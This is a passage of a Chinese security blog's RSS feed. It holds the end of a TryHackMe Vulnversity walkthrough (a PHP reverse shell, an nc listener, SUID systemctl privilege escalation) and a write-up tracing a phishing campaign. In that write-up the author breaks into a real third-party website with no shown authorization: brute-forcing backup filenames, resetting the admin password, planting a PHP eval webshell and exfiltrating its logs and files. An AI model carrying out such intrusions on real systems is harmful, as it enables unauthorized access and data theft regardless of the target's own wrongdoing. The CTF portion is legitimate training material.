&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;取消URL默认编码（Payload文件名中的&amp;rdquo;.&amp;ldquo;被URL编码会导致访问失败）&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;Burpsuite --&amp;gt; Intruder --&amp;gt; Payloads --&amp;gt; Payload Encoding --&amp;gt; BurpsuitePayload Encoding
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;a href=&#34;https://user-images.githubusercontent.com/58038111/78397736-57abd280-7624-11ea-9864-4834a018a5c5.png&#34;&gt;&lt;img src=&#34;https://user-images.githubusercontent.com/58038111/78397736-57abd280-7624-11ea-9864-4834a018a5c5.png&#34; alt=&#34;image&#34;&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;发现可以上传.phhtm&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://user-images.githubusercontent.com/58038111/78397762-61353a80-7624-11ea-80c0-a44063a0a825.png&#34;&gt;&lt;img src=&#34;https://user-images.githubusercontent.com/58038111/78397762-61353a80-7624-11ea-80c0-a44063a0a825.png&#34; alt=&#34;image&#34;&gt;&lt;/a&gt;&lt;/p&gt;
&lt;h2 id=&#34;0x04-上传webshell&#34;&gt;0x04 上传Webshell&lt;/h2&gt;
&lt;pre&gt;&lt;code&gt;wget https://github.com/pentestmonkey/php-reverse-shell/raw/master/php-reverse-shell.php -O php-reverse-shell.phtml
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;反弹IP修改为本机（攻击机）&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://user-images.githubusercontent.com/58038111/78397775-6a260c00-7624-11ea-843c-357f2b05af34.png&#34;&gt;&lt;img src=&#34;https://user-images.githubusercontent.com/58038111/78397775-6a260c00-7624-11ea-843c-357f2b05af34.png&#34; alt=&#34;image&#34;&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://user-images.githubusercontent.com/58038111/78397793-727e4700-7624-11ea-9429-ed2352309dda.png&#34;&gt;&lt;img src=&#34;https://user-images.githubusercontent.com/58038111/78397793-727e4700-7624-11ea-9429-ed2352309dda.png&#34; alt=&#34;image&#34;&gt;&lt;/a&gt;&lt;/p&gt;
&lt;h2 id=&#34;0x04-反弹shell&#34;&gt;0x04 反弹shell&lt;/h2&gt;
&lt;p&gt;本机NC监听1234端口&lt;/p&gt;
&lt;pre&gt;&lt;code&gt; nc -lvnp 1234
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;访问后门后获得shell，flag在用户目录下&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;$ cat /home/bill/user.txt
8bd7992fxxxxxxxxxxxxxxxxxxxxxx
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;a href=&#34;https://user-images.githubusercontent.com/58038111/78397841-8aee6180-7624-11ea-9fe0-a51017f5de30.png&#34;&gt;&lt;img src=&#34;https://user-images.githubusercontent.com/58038111/78397841-8aee6180-7624-11ea-9fe0-a51017f5de30.png&#34; alt=&#34;image&#34;&gt;&lt;/a&gt;&lt;/p&gt;
&lt;h2 id=&#34;0x04-提权&#34;&gt;0x04 提权&lt;/h2&gt;
&lt;p&gt;利用SUID提权，搜索所有SUID文件&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://user-images.githubusercontent.com/58038111/78397885-a0638b80-7624-11ea-8dae-c7ca889e8185.png&#34;&gt;&lt;img src=&#34;https://user-images.githubusercontent.com/58038111/78397885-a0638b80-7624-11ea-8dae-c7ca889e8185.png&#34; alt=&#34;image&#34;&gt;&lt;/a&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;$ find / -perm -4000 2&amp;gt; /dev/null | xargs ls -lah
-rwsr-xr-x 1 root   root        31K Jul 12  2016 /bin/fusermount
-rwsr-xr-x 1 root   root        40K May 16  2018 /bin/mount
-rwsr-xr-x 1 root   root       139K Jan 28  2017 /bin/ntfs-3g
-rwsr-xr-x 1 root   root        44K May  7  2014 /bin/ping
-rwsr-xr-x 1 root   root        44K May  7  2014 /bin/ping6
-rwsr-xr-x 1 root   root        40K May 16  2017 /bin/su
-rwsr-xr-x 1 root   root       645K Feb 13  2019 /bin/systemctl
-rwsr-xr-x 1 root   root        27K May 16  2018 /bin/umount
-rwsr-xr-x 1 root   root        35K Mar  6  2017 /sbin/mount.cifs
-rwsr-sr-x 1 daemon daemon      51K Jan 14  2016 /usr/bin/at
-rwsr-xr-x 1 root   root        49K May 16  2017 /usr/bin/chfn
-rwsr-xr-x 1 root   root        40K May 16  2017 /usr/bin/chsh
-rwsr-xr-x 1 root   root        74K May 16  2017 /usr/bin/gpasswd
-rwsr-xr-x 1 root   root        33K May 16  2017 /usr/bin/newgidmap
-rwsr-xr-x 1 root   root        39K May 16  2017 /usr/bin/newgrp
-rwsr-xr-x 1 root   root        33K May 16  2017 /usr/bin/newuidmap
-rwsr-xr-x 1 root   root        53K May 16  2017 /usr/bin/passwd
-rwsr-xr-x 1 root   root        23K Jan 15  2019 /usr/bin/pkexec
-rwsr-xr-x 1 root   root       134K Jul  4  2017 /usr/bin/sudo
-rwsr-xr-- 1 root   messagebus  42K Jan 12  2017 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
-rwsr-xr-x 1 root   root        10K Mar 27  2017 /usr/lib/eject/dmcrypt-get-device
-rwsr-xr-x 1 root   root       419K Jan 31  2019 /usr/lib/openssh/ssh-keysign
-rwsr-xr-x 1 root   root        15K Jan 15  2019 /usr/lib/policykit-1/polkit-agent-helper-1
-rwsr-sr-x 1 root   root        97K Jan 29  2019 /usr/lib/snapd/snap-confine
-rwsr-xr-x 1 root   root        75K Jul 17 11:22 /usr/lib/squid/pinger
-rwsr-xr-x 1 root   root        3
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;a href=&#34;https://user-images.githubusercontent.com/58038111/78397938-bd985a00-7624-11ea-8ec2-acb884811b74.png&#34;&gt;&lt;img src=&#34;https://user-images.githubusercontent.com/58038111/78397938-bd985a00-7624-11ea-8ec2-acb884811b74.png&#34; alt=&#34;image&#34;&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;我们看到靶机系统允许所有登陆用户创建系统服务并以root权限运行，systemctl用于控制systemd初始化服务的工具。&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;xxx=$(mktemp).service 
//创建一个名为xxx的环境变量，调用mktemp创建一个临时的systemd服务配置文件
                                 
echo &#39;[Service]
ExecStart=/bin/sh -c &amp;quot;cat /root/root.txt &amp;gt; /tmp/output&amp;quot;
[Install]
WantedBy=multi-user.target&#39; &amp;gt; $xxx
//将配置内容写入环境变量，服务执行后通过root权限去读flag文件。

/bin/systemctl link $xxx
/bin/systemctl enable --now $xxx
//链接服务并启动


cat /tmp/output
a58ffxxxxxxxxxxxxxxxxxxx
//获得root flag
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;a href=&#34;https://user-images.githubusercontent.com/58038111/78397966-d0ab2a00-7624-11ea-8767-ea046bc138e5.png&#34;&gt;&lt;img src=&#34;https://user-images.githubusercontent.com/58038111/78397966-d0ab2a00-7624-11ea-8767-ea046bc138e5.png&#34; alt=&#34;image&#34;&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;systemctl提权参考GTFOBins项目文章：https://gtfobins.github.io/gtfobins/systemctl/#suid&lt;/p&gt;
- https://xeye.io/posts/%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95tryhackme-vulnversity/ - </description>
        </item>
    
    
    
        <item>
        <title>About</title>
        <link>https://xeye.io/about/</link>
        <pubDate>Wed, 01 Apr 2020 17:50:28 +0800</pubDate>
        
        <guid>https://xeye.io/about/</guid>
        <description>XEYE https://xeye.io/about/ -&lt;p&gt;ID：道明君（DMJ）&lt;/p&gt;
&lt;p&gt;职业：信息安全行业小学生&lt;/p&gt;
&lt;p&gt;Blog：https://xeye.io&lt;/p&gt;
&lt;p&gt;Email：x(at)xeye(dot)io&lt;/p&gt;
- https://xeye.io/about/ - </description>
        </item>
    
    
    
        <item>
        <title>如何通过一封恶意邮件追踪幕后黑客组织</title>
        <link>https://xeye.io/posts/%E5%A6%82%E4%BD%95%E9%80%9A%E8%BF%87%E4%B8%80%E5%B0%81%E6%81%B6%E6%84%8F%E9%82%AE%E4%BB%B6%E8%BF%BD%E8%B8%AA%E5%B9%95%E5%90%8E%E9%BB%91%E5%AE%A2%E7%BB%84%E7%BB%87/</link>
        <pubDate>Sat, 02 Nov 2019 13:48:59 +0800</pubDate>
        
        <guid>https://xeye.io/posts/%E5%A6%82%E4%BD%95%E9%80%9A%E8%BF%87%E4%B8%80%E5%B0%81%E6%81%B6%E6%84%8F%E9%82%AE%E4%BB%B6%E8%BF%BD%E8%B8%AA%E5%B9%95%E5%90%8E%E9%BB%91%E5%AE%A2%E7%BB%84%E7%BB%87/</guid>
        <description>XEYE https://xeye.io/posts/%E5%A6%82%E4%BD%95%E9%80%9A%E8%BF%87%E4%B8%80%E5%B0%81%E6%81%B6%E6%84%8F%E9%82%AE%E4%BB%B6%E8%BF%BD%E8%B8%AA%E5%B9%95%E5%90%8E%E9%BB%91%E5%AE%A2%E7%BB%84%E7%BB%87/ -&lt;blockquote&gt;
&lt;p&gt;声明：本文曾经发表在FreeBuf，文章分享的思路与方法仅供信息安全同行研究，请勿用于非法。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&#34;一前言&#34;&gt;一、前言&lt;/h2&gt;
&lt;p&gt;近日朋友收到一封来自海外的钓鱼邮件，委托我帮忙分析。因此我对钓鱼者身份和攻击路径进行了一次详细的溯源。大致摸清了攻击者组织身份、攻击手法以及动机。本次溯源工作主要是通过提取攻击者控制的肉鸡服务器、网站访问日志、攻击者后门特征等。关联分析这些日志和特征最终得到攻击者的身份信息。本文以流水账的方式，详细记录整个溯源过程，包括分析手法和思路，以供安全研究人员参考。&lt;/p&gt;
&lt;hr&gt;
&lt;h2 id=&#34;二信息收集&#34;&gt;二、信息收集&lt;/h2&gt;
&lt;p&gt;这是一封冒充 Microsoft Outlook WebApp 密码过期的钓鱼邮件：&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://camo.githubusercontent.com/81fde0460d50552e89d30550c007c34c8673b436/687474703a2f2f7374617469632e7a7962756c756f2e636f6d2f62616971692f6e736e7232653234743975336a796c377a39797062786b372f254539253932253933254539254231254243254539253832254145254534254242254236312e6a7067&#34; alt=&#34;钓鱼邮件1.jpg-172.9kB&#34;&gt;&lt;/p&gt;
&lt;h3 id=&#34;21-邮件正文&#34;&gt;2.1 &lt;strong&gt;邮件正文：&lt;/strong&gt;&lt;/h3&gt;
&lt;pre&gt;&lt;code&gt;Received: from sysmailout1.platon.sk (unknown [85.248.228.17])
	by bizmx16.qq.com (NewMx) with SMTP id 
	for &amp;lt;test@test.cn&amp;gt;; Thu, 29 Nov 2018 06:56:41 +0800
X-QQ-SPAM: true
X-QQ-FEAT: jfJxHuYZxOCSeMM7azx75jXNlqmrApsudtGuMpkas54ZAC17UV7M4b/R5+7i0
	PKMg4QGPsKjsZDM+XUXd0s8kb9W0jCArNfxa3+HTU9vKECwH9fbHyzA2+de0ctDM9+ziJ5w
	1BJI2Ppc9DVh5DYSq8ySLhcBVRj6sBsJefxrSztWrgzKi58wWFCv7LPgqOAXS+VVMyVipbT
	fHFacZXmdB00T62nXv8xQociZvHE+8ELBoHVgcA3ZWA7p4no8o1e0Z8ShUvX2P5FwhvXPLZ
	QUg8HNiMhXk5NEtQVC0Y7R9JwKV2VeKybQbg==
X-QQ-MAILINFO: Mms3jrkBGwMrz972clMUbgsPqZ0t5EGjrqWV2rMFcEfTT5Y9lunbPCtSM
	4HaaK+iUBVTvuth5bvdEvVKkuiTcOnkJ0t3khnTYcRGfQmEIZI+ZrNXlT/8QxjWMjOsiHkK
	yGbgfv5Gx9Qr65abnNzXymg=
X-QQ-mid: bizmx16t1543445804ti4ex7suw
X-QQ-CSender: www-data@m7web1.platon.sk
X-QQ-ORGSender: www-data@m7web1.platon.sk
X-KK-mid:bizmxp6t1543445804t9ne878su
Received: from m7web1.platon.sk (m7web1.platon.sk [85.248.229.150])
	by sysmailout1.platon.sk (Postfix) with ESMTP id 8EFCC217002E
	for &amp;lt;test@test.cn&amp;gt;; Wed, 28 Nov 2018 23:56:38 +0100 (CET)
Received: by m7web1.platon.sk (Postfix, from userid 33)
	id 89364400A3A1; Wed, 28 Nov 2018 23:56:38 +0100 (CET)
To: test@test.cn
Subject: =?UTF-8?Q?Password_expiry_notice?=
Date: Wed, 28 Nov 2018 23:56:38 +0100
From: =?UTF-8?Q?Microsoft_Online_Services_Team?= &amp;lt;no-response@365.mirohaviar.sk&amp;gt;
Message-ID: &amp;lt;0a9ee06dc11866565f0302302c647c7a@www.mirohaviar.sk&amp;gt;
X-Priority: 3
MIME-Version: 1.0
Content-Transfer-Encoding: quoted-printable
Content-Type: text/html; charset=&amp;quot;us-ascii&amp;quot;

略...

&amp;lt;br&amp;gt;The password for the Microsoft 365 account&amp;lt;span style=3D&amp;quot;font-weight: b=
old;&amp;quot;&amp;gt; test@test.cn
&amp;lt;/span&amp;gt; has
expired.&amp;lt;br&amp;gt;![mir-nc.png-57.1kB][2]
&amp;lt;span class=3D&amp;quot;Apple-converted-space&amp;quot;&amp;gt;&amp;lt;/span&amp;gt;&amp;lt;br&amp;gt;To protect your Microsoft =
account, your existing password may cease to work
shortly.&amp;lt;br&amp;gt;
&amp;lt;br&amp;gt;
You are now required to &amp;lt;span class=3D&amp;quot;Apple-converted-space&amp;quot;&amp;gt;&amp;lt;/span&amp;gt;&amp;lt;a hre=
f=3D&amp;quot;http://www.rosturplast.com/shells/logon.secureaccess/?ml=3Dtest@=
test.cn
&amp;quot;&amp;gt;&amp;lt;span style=3D&amp;quot;font-weight: bold;&amp;quot;&amp;gt;change
your password&amp;lt;/span&amp;gt;&amp;lt;/a&amp;gt;
immediateIy.&amp;lt;span class=3D&amp;quot;Apple-converted-space&amp;quot;&amp;gt; &amp;lt;br&amp;gt;
=2E&amp;lt;/span&amp;gt;&amp;lt;br&amp;gt;
&amp;lt;a href=3D&amp;quot;http://www.rosturplast.com/shells/logon.secureaccess/?ml=3Dtest=@test.cn

略...
&lt;/code&gt;&lt;/pre&gt;&lt;h3 id=&#34;22-分析邮件内容&#34;&gt;&lt;strong&gt;2.2 分析邮件内容&lt;/strong&gt;&lt;/h3&gt;
&lt;p&gt;&lt;strong&gt;根据邮件内容得到的信息如下：&lt;/strong&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;钓鱼网站： [www.rosturplast.com（137.74.81.5](&lt;a href=&#34;http://www.rosturplast.com&#34;&gt;http://www.rosturplast.com&lt;/a&gt;(137.74.81.5/) 法国） 钓鱼链接: &lt;a href=&#34;http://www.rosturplast.com/shells/logon.secureaccess/?ml=test@test.cn&#34;&gt;http://www.rosturplast.com/shells/logon.secureaccess/?ml=test@test.cn&lt;/a&gt; 发件地址： &lt;a href=&#34;mailto:no-response@365.mirohaviar.sk&#34;&gt;no-response@365.mirohaviar.sk&lt;/a&gt; 服务商： Platon Technologies, s.r.o （斯洛伐克） SMTP： sysmailout1.platon.sk （85.248.228.17 斯洛伐克）&lt;/p&gt;
&lt;/blockquote&gt;
&lt;hr&gt;
&lt;h2 id=&#34;三渗透钓鱼网站&#34;&gt;三、渗透钓鱼网站&lt;/h2&gt;
&lt;h3 id=&#34;31-漏洞分析&#34;&gt;&lt;strong&gt;3.1 漏洞分析&lt;/strong&gt;&lt;/h3&gt;
&lt;blockquote&gt;
&lt;p&gt;目标网站：www.rosturplast.com&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;访问钓鱼链接，一个克隆OWA修改密码的的虚假页面，我们按照正常流程走一遍，密码随便输入。不出所料页面提示密码错误，这么做可以收集受害者多个密码提高成功率，仔细想想这个功能还是很贴心的：）。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Step 1&lt;/strong&gt; &lt;img src=&#34;https://camo.githubusercontent.com/cf5eb29e9f1a216452e33baa9c5af05a0e6c98a6/687474703a2f2f7374617469632e7a7962756c756f2e636f6d2f62616971692f653779673171336c64797037636d333232787866356e70392f254539253932253933254539254231254243254539253832254145254534254242254236254539254131254235254539253944254132312e706e67&#34; alt=&#34;钓鱼邮件页面1.png-45.6kB&#34;&gt; &lt;strong&gt;Step 2&lt;/strong&gt; &lt;img src=&#34;https://camo.githubusercontent.com/522755c214de839e26bebbde65f19ae5cad0f903/687474703a2f2f7374617469632e7a7962756c756f2e636f6d2f62616971692f6c67686876326d3363316a6b31366d71663562336a346b682f254539253932253933254539254231254243254539253832254145254534254242254236254539254131254235254539253944254132332e706e67&#34; alt=&#34;钓鱼邮件页面3.png-50.6kB&#34;&gt; &lt;strong&gt;Step 3&lt;/strong&gt; &lt;img src=&#34;https://camo.githubusercontent.com/0ff9a3be9307405c51a01af5b5f1347f10c8b2a2/687474703a2f2f7374617469632e7a7962756c756f2e636f6d2f62616971692f73626138626f7261637471626e71736f6b6e377570666e6d2f254539253932253933254539254231254243254539253832254145254534254242254236254539254131254235254539253944254132322e706e67&#34; alt=&#34;钓鱼邮件页面2.png-35.6kB&#34;&gt;&lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;&lt;strong&gt;抓包如下：&lt;/strong&gt; 注入、跨站之流都是不存在的。 &lt;img src=&#34;https://camo.githubusercontent.com/4c89986d1c0ae66586cac60c4779d652d078e3a3/687474703a2f2f7374617469632e7a7962756c756f2e636f6d2f62616971692f3877773975727833323161677a7239796169306d756e73392f2545392539322539332545392542312542432545392541312542352545392539442541322545382541312541382545352538442539352545362538462539302545342542412541342545362538412539332545352538432538352e706e67&#34; alt=&#34;钓鱼页面表单提交抓包.png-205.9kB&#34;&gt;&lt;/p&gt;
&lt;p&gt;访问首页，这是一家俄罗斯的塑料水管厂商，攻击者入侵了这个网站，放置了钓鱼页面，再通过邮件传播。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://camo.githubusercontent.com/7e6da9683c707c97e84f2ea3af89ddff0b97613c/687474703a2f2f7374617469632e7a7962756c756f2e636f6d2f62616971692f6867367636353961686e6276646b7874786c6437646670722f53637265656e73686f742d323031382d31322d31312532305254502532302545322538302539332532305275737369616e2532306d616e7566616374757265722532306f66253230706c61737469632532307069706573253230616e6425323066697474696e6773253230254532253830253933253230486967682532305175616c6974792532305069706573253230616e6425323046697474696e67732e706e67&#34; alt=&#34;Screenshot-2018-12-11 RTP – Russian manufacturer of plastic pipes and fittings – High Quality Pipes and Fittings.png-1622.7kB&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;端口扫描显示开放了一堆端口，防火墙做了策略限制。&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://camo.githubusercontent.com/4904d66caa52b9b4e70086311ed21b79c32e984e/687474703a2f2f7374617469632e7a7962756c756f2e636f6d2f62616971692f36707677726e3374393571646e33776366303134636d33302f6e6d61702d726f73747572706c6173742e636f6d2d636172626f6e2e706e67&#34; alt=&#34;nmap-rosturplast.com-carbon.png-397.3kB&#34;&gt; &lt;strong&gt;通过扫描分析，得到沦陷主机信息如下:&lt;/strong&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;[+] HOST: &lt;a href=&#34;http://www.rosturplast.com/&#34;&gt;www.rosturplast.com&lt;/a&gt; （137.74.81.5 法国） [+] OS: Red Hat 4.8 [+] Web Server: Apache/2.4.6 OpenSSL/1.0.2k-fips mod_fcgid/2.3.9 PHP/5.4.16 [+] CMS: Joomla 3.3.3 （Joomla!是一套海外流行的建站系统，基于PHP+MySQL开发）&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;strong&gt;这是一个低版本的Joomla，joomscan扫描显示受害网站有一堆漏洞，看起来弱不禁风，Getshell指日可待。&lt;/strong&gt; &lt;img src=&#34;https://camo.githubusercontent.com/0d3ce62a2869ce0a73eea5618edb10c20f3627a0/687474703a2f2f7374617469632e7a7962756c756f2e636f6d2f62616971692f746c627a666d616c307538747a79756b6e696677716d37652f6a6f6f6d7363616e2d726f73747572706c6173742e706e67&#34; alt=&#34;joomscan-rosturplast.png-995.8kB&#34;&gt;&lt;/p&gt;
&lt;p&gt;扫描发现PHPMailer RCE漏洞，不过需要邮件发送表单功能才能利用，这一堆漏洞里面，看起来唯一有机会的是CVE-2016-9838（Joomla! Core Remote Privilege Escalation Vulnerability），然而经过测试攻击者（丧心病狂）贴心的把用户注册页面删除了！堵住了漏洞，导致无法利用。 &lt;img src=&#34;https://camo.githubusercontent.com/9d2fabf7fa89b55eab38a86b94db0708b48ed275/687474703a2f2f7374617469632e7a7962756c756f2e636f6d2f62616971692f766b6a7074356d767577333631386d716f3339366e3167652f4669726553686f74253230436170747572652532302e706e67&#34; alt=&#34;FireShot Capture .png-146.7kB&#34;&gt;&lt;/p&gt;
&lt;p&gt;机智的我（此时毫无办法），开始挂字典整合Joomla目录盲扫备份文件，最后发现目标存在PhpMyAdmin后台，和一个报错页面，页面显示了网站绝对路径和疑似以日期格式生成的网站备份的文件名。&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;/var/www/rosturpl/data/www/rosturplast.com/rosturplast.com.2015-11-11.zip
&lt;/code&gt;&lt;/pre&gt;&lt;h3 id=&#34;32-陷入僵局&#34;&gt;&lt;strong&gt;3.2 陷入僵局&lt;/strong&gt;&lt;/h3&gt;
&lt;p&gt;尝试下载这个文件，http响应404。看了一下同站有多个站点，但旁站渗透是个体力活，国外这种典型的CloudLinux+cPanel的架构不好提权。到这一步陷入了僵局，睡个午觉养养神，下午继续研究。&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;wget http://www.rosturplast.com/rosturplast.com.2015-11-11.zip  错误 404：Not Found
&lt;/code&gt;&lt;/pre&gt;&lt;h3 id=&#34;33-后台提权&#34;&gt;&lt;strong&gt;3.3 后台提权&lt;/strong&gt;&lt;/h3&gt;
&lt;p&gt;不到万不得已，不从旁站和C段入手，稍加思索根据报错页面的备份文件名格式生成日期文件，尝试遍历日期下载，碰碰运气。&lt;/p&gt;
&lt;p&gt;脚本内容：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;#!/bin/bash
startdate=`date -d &amp;quot;+0 day $1&amp;quot; +%Y%m%d`
enddate=`date -d &amp;quot;+0 day $2&amp;quot; +%Y%m%d`
while [[ $startdate -le $enddate ]]
do
date=$startdate
startdateother=`date -d &amp;quot;+0 day $date&amp;quot; +%Y-%m-%d`
dateother=$startdateother
url=http://www.rosturplast.com/rosturplast.com.$dateother.zip
echo &amp;quot;$url&amp;quot;
startdate=`date -d &amp;quot;+1 day $date&amp;quot; +%Y-%m-%d`
startdateother=`date -d &amp;quot;+1 day $date&amp;quot; +%Y-%m-%d`
wget $url
done
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;脚本大概跑了一个下午，当到达2017-08-07的时候，响应200状态码，看到rosturplast.com.2017-08-07.zip的文件大小为177M 感觉成了，解压后果然是整站备份，果然是柳暗花明又一shell。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://camo.githubusercontent.com/d742c66f0c94150e00d18052faeaa988146bc779/687474703a2f2f7374617469632e7a7962756c756f2e636f6d2f62616971692f666969657a397575377231327a71726a37736c77626536742f776765742d726f73747572702e706e67&#34; alt=&#34;wget-rosturp.png-864.5kB&#34;&gt; &lt;img src=&#34;https://camo.githubusercontent.com/d84503f1cb7d92cfa3993c90bddb2a46213c13b6/687474703a2f2f7374617469632e7a7962756c756f2e636f6d2f62616971692f74386e3036777a347932707676306f7930323174343837682f323031382d31322d313225323030322d34342d31302545352542312538462545352542392539352545362538382541412545352539422542452e706e67&#34; alt=&#34;2018-12-01 05-18-10屏幕截图.png-159.4kB&#34;&gt;&lt;/p&gt;
&lt;p&gt;查看配置文件&lt;code&gt;configuration.php&lt;/code&gt;得到数据库连接信息，登录PhpMyAdmin后台。低权限无法直接写shell，只能修改默认密码登录Joomla!后台。&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;public $dbtype = &#39;mysqli&#39;;
public $host = &#39;localhost&#39;;
public $user = &#39;user***&#39;;            //敏感信息打码
public $password = &#39;K********6759&#39;;  //敏感信息打码
public $db = &#39;rtp_com3&#39;;
public $dbprefix = &#39;ms8ef_&#39;;
public $live_site = &#39;&#39;;
public $secret = &#39;5qp******4zU&#39;;     //敏感信息打码    
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img src=&#34;https://camo.githubusercontent.com/3999076e3cbb3ff3a14bf8e31a0b133e5bcf43af/687474703a2f2f7374617469632e7a7962756c756f2e636f6d2f62616971692f32736d69386e3478627766797435396b67336b70683737782f726f73747572702e636f6e66696775726174696f6e2d2e706e67&#34; alt=&#34;rosturp.configuration-.png-708.2kB&#34;&gt; &lt;img src=&#34;https://camo.githubusercontent.com/70f852977521022cc9e46a481e5c09a07b1f987c/687474703a2f2f7374617469632e7a7962756c756f2e636f6d2f62616971692f63767268387a303865346371356e30693779657871356f642f726f73747572706c6173742e636f6d2d7068706d7961646d696e253230253238312532392e706e67&#34; alt=&#34;rosturplast.com-phpmyadmin (1).png-136.6kB&#34;&gt;&lt;/p&gt;
&lt;p&gt;备份原始密文以备还原，将后台密码修改为 test123456XYZ&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;http://www.rosturplast.com/administrator/
admin / test123456XYZ
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img src=&#34;https://camo.githubusercontent.com/10f01d18e5f466489ec82be2f3f2ce7b7e90b267/687474703a2f2f7374617469632e7a7962756c756f2e636f6d2f62616971692f656d717672677171336c6d76667a397230736e61666f6c6c2f6a6f6f6d6c612d6d616e61676572312e706e67&#34; alt=&#34;joomla-manager1.png-132.6kB&#34;&gt;&lt;/p&gt;
&lt;p&gt;登录后台，通过模板写入WebShell&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;Extensions &amp;mdash;&amp;gt; Template Manager &amp;mdash;&amp;gt; Template &amp;mdash;&amp;gt; New Files &amp;mdash;&amp;gt; PHP WebSehll&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;img src=&#34;https://camo.githubusercontent.com/810997b0abe5948c060ba41b4a0384108e964ba4/687474703a2f2f7374617469632e7a7962756c756f2e636f6d2f62616971692f703261756e62387a65316935396831326a6579756a70326e2f6a6f6f6d6c612d6765747368656c6c312e706e67&#34; alt=&#34;joomla-getshell1.png-83.2kB&#34;&gt; 这里写入了PHP一句话WebShell，通过Cknife（java版中国菜刀）对网站进行控制。&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;&amp;lt;?php @eval($_POST[&#39;cmd&#39;]);?&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img src=&#34;https://camo.githubusercontent.com/80c66b50852ff17c263e8486497c82e008a692d8/687474703a2f2f7374617469632e7a7962756c756f2e636f6d2f62616971692f787736676470626d7a3472753168357a71346e73737172332f323031382d31312d323925323031332d30342d34332545352542312538462545352542392539352545362538382541412545352539422542452e706e67&#34; alt=&#34;2018-11-29 13-04-43屏幕截图.png-140.1kB&#34;&gt;&lt;/p&gt;
&lt;p&gt;查看攻击者的钓鱼文件目录，&lt;code&gt;user.txt&lt;/code&gt; 详细记录了上钩的受害者信息。 &lt;img src=&#34;https://camo.githubusercontent.com/3464c9bb4b262872029448fd0c9000d691713d0d/687474703a2f2f7374617469632e7a7962756c756f2e636f6d2f62616971692f3732726531386230697377357a6777676e776678616b6a692f726f73747275706c6173742e636f6d2d757365722e7478742d2e706e67&#34; alt=&#34;rostruplast.com-user.txt-.png-138kB&#34;&gt;&lt;/p&gt;
&lt;h3 id=&#34;34-日志分析&#34;&gt;&lt;strong&gt;3.4 日志分析&lt;/strong&gt;&lt;/h3&gt;
&lt;p&gt;将网站文件和访问日志下载到本地分析&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;[/tmp]$ tar zcvf /var/www/rosturpl/data/www/rosturplast.com/log.tar.gz /var/www/rosturpl/data/access-logs /var/www/rosturpl/data/logs/rosturplast*

[/tmp]$ tar zcvf /var/www/rosturpl/data/www/rosturplast.com/www.tar.gz  --exclude=/var/www/rosturpl/data/www/rosturplast.com/www.tar.gz  /var/www/rosturpl/data/www/rosturplast.com/

wget -c http://www.rosturplast.com/log.tar.gz &amp;amp;&amp;amp; wget -c http://www.rosturplast.com/www.tar.gz

⚡ root@kali  /tmp  gzip -d *.gz
⚡ root@kali  /tmp  ls -lh

总用量 22M
-rw-r----- 1 48 6313 392K 11月 30 16:19 rosturplast.com.access.log
-rw-r----- 1 48 6313 418K 11月 21 08:08 rosturplast.com.access.log-20181121
-rw-r----- 1 48 6313 315K 11月 22 08:27 rosturplast.com.access.log-20181122
-rw-r----- 1 48 6313 367K 11月 23 08:08 rosturplast.com.access.log-20181123
-rw-r----- 1 48 6313 332K 11月 24 08:20 rosturplast.com.access.log-20181124
-rw-r----- 1 48 6313 394K 11月 25 08:30 rosturplast.com.access.log-20181125
-rw-r----- 1 48 6313 217K 11月 26 08:27 rosturplast.com.access.log-20181126
-rw-r----- 1 48 6313 338K 11月 27 08:07 rosturplast.com.access.log-20181127
-rw-r----- 1 48 6313 1.8M 11月 28 08:35 rosturplast.com.access.log-20181128
-rw-r----- 1 48 6313 2.3M 11月 29 08:38 rosturplast.com.access.log-20181129
-rw-r----- 1 48 6313 6.4M 11月 30 08:38 rosturplast.com.access.log-20181130
-rw-rw---- 1 48 6313 267K 11月 30 16:00 rosturplast.com.error.log
-rw-rw---- 1 48 6313 3.8K 11月 21 03:44 rosturplast.com.error.log-20181121
